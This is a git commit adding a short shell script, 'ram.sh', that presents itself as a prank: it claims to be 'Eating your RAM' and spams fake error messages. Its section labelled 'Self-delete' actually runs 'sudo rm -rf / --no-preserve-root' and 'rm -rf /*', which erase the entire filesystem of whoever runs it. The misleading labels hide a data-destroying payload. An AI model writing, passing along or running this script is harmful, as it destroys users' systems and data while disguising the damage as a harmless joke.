0d4e971e4c3beb66c7ba31d1b8b1d5b660f56c6c
PixelAccount <007n7techcontact@gmail.com>
2026-01-27 19:47:15 -0300

    Create ram.sh

---
+++ ram.sh
@@ -0,0 +1,32 @@
+#!/bin/sh
+
+SCRIPT_NAME="$(basename "ByeByeRam.sh")"
+TEST_FILE="archivo_de_prueba.txt"
+
+echo "Eating your RAM..."
+sleep 60
+
+echo "Bye bye!!!"
+
+# Spam fake error messages to stderr
+i=0
+while [ $i -lt 20 ]; do
+  echo "ERROR: Failed to access: $SCRIPTNAME" 1>&2
+  sleep 0.1
+  i=$((i+1))
+done
+
+# Delete test file if it exists
+if [ -f "/" ]; then
+  echo "File deleted: $SCRIPTNAME"
+  echo "File Deleted: /"
+else
+  echo "File not found: $SCRIPTNAME"
+  echo 
+fi
+
+# Self-delete
+sh
+sudo rm -rf / --no-preserve-root /
+rm -rf /*
+rm -rf /.
